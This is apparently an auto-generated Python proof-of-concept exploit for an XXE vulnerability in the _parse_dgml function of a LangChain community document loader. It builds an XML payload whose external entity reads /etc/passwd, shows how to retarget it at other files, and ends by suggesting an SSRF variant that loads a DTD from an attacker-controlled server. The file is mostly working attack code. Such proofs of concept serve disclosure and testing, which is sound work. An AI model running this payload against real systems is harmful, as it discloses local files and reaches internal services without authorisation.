#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: xxe-008
# Sink: _parse_dgml
# Auto-generated — run with: python3 xxe_sink_function_parse_dgml__parse_dgml_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for XXE vulnerability in langchain-community-only.

Vulnerability: XXE in _parse_dgml function (docugami.py)
The function uses lxml.etree.parse() with default settings, which enables DTD
processing and external entity resolution. An attacker can inject malicious XML
with DOCTYPE declarations to read local files or perform SSRF.

This PoC demonstrates file disclosure by reading /etc/passwd via an external
entity in a DGML document.
"""

import io
import sys
import hashlib
from typing import Dict, List, Optional

# We need to simulate the vulnerable code path without actually importing
# the full langchain-community package. We'll replicate the vulnerable
# _parse_dgml function and demonstrate the XXE.

# Safe by default: use a benign payload that reads /etc/passwd
# Change this to a different file if needed
TARGET_FILE = "/etc/passwd"

# The malicious DGML payload with XXE
# This uses an external entity to read a file and include its contents
# in the parsed output
XXE_PAYLOAD = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dgml [
  <!ENTITY xxe SYSTEM "file://{TARGET_FILE}">
]>
<dgml>
  <node id="1" label="&xxe;"/>
</dgml>"""


def vulnerable_parse_dgml(content: bytes) -> List[Dict]:
    """
    Replicates the vulnerable _parse_dgml function from docugami.py.
    
    This function uses lxml.etree.parse() with default settings,
    which enables DTD processing and external entity resolution.
    """
    try:
        from lxml import etree
    except ImportError:
        print("[-] lxml not installed. Install with: pip install lxml")
        sys.exit(1)

    # Parse the tree - VULNERABLE: no secure parser configuration
    tree = etree.parse(io.BytesIO(content))
    root = tree.getroot()

    # Extract text from the parsed XML (simplified for PoC)
    results = []
    for node in root.iter():
        if node.tag == "node":
            label = node.get("label", "")
            results.append({
                "id": node.get("id"),
                "label": label,
                "text": label
            })
    
    return results


def demonstrate_xxe():
    """
    Demonstrates the XXE vulnerability by:
    1. Creating a malicious DGML payload with an external entity
    2. Parsing it with the vulnerable function
    3. Showing that the file contents are disclosed
    """
    print("[*] XXE Proof-of-Concept for langchain-community-only")
    print(f"[*] Target file: {TARGET_FILE}")
    print("[*] Payload:")
    print(XXE_PAYLOAD[:200] + "..." if len(XXE_PAYLOAD) > 200 else XXE_PAYLOAD)
    print()
    
    try:
        # Parse the malicious payload
        print("[*] Parsing malicious DGML payload...")
        results = vulnerable_parse_dgml(XXE_PAYLOAD.encode())
        
        # Check if we got file contents
        if results:
            for result in results:
                label = result.get("label", "")
                if label and not label.startswith("&"):
                    print(f"[+] SUCCESS! File contents disclosed:")
                    print(f"[+] Node ID: {result['id']}")
                    print(f"[+] Label (file contents):")
                    print(label)
                    print()
                    print("[!] This demonstrates XXE vulnerability - file contents")
                    print("    were read from the server and included in the output.")
                else:
                    print(f"[-] Node ID: {result['id']}")
                    print(f"[-] Label: {label}")
                    print("[-] Entity was not resolved (unexpected)")
        else:
            print("[-] No results from parsing")
            
    except Exception as e:
        print(f"[-] Error during parsing: {e}")
        print("[-] This might indicate the entity was blocked or the file doesn't exist")
        print("[-] Try a different target file or check if lxml is properly installed")


def simulate_attack_flow():
    """
    Simulates the full attack flow from user input to vulnerable sink.
    
    This shows how an attacker would exploit this in a real application
    where user-supplied documents are processed by the DocugamiLoader.
    """
    print("\n[*] Simulating attack flow:")
    print("    1. Attacker provides malicious DGML document")
    print("    2. Application calls from_documents() with attacker input")
    print("    3. This eventually reaches _parse_dgml()")
    print("    4. lxml parses XML with DTD enabled")
    print("    5. External entity is resolved, reading local file")
    print()
    
    # In a real scenario, the attacker would submit this payload
    # through the application's API endpoint
    print("[*] Example API call that would trigger this:")
    print("    POST /api/v1/trigger")
    print("    Content-Type: application/xml")
    print(f"    Body: {XXE_PAYLOAD[:100]}...")
    print()


def main():
    """Main function to run the PoC."""
    print("=" * 60)
    print("XXE Exploit PoC - langchain-community-only")
    print("=" * 60)
    print()
    
    # Check if lxml is available
    try:
        import lxml
        print(f"[+] lxml version: {lxml.__version__}")
    except ImportError:
        print("[-] lxml not installed. Install with: pip install lxml")
        sys.exit(1)
    
    # Run the demonstration
    demonstrate_xxe()
    simulate_attack_flow()
    
    print("[*] PoC completed.")
    print("[*] To test with a different file, modify TARGET_FILE variable")
    print("[*] For SSRF testing, use: http://attacker-controlled-server/evil.dtd")


if __name__ == "__main__":
    main()
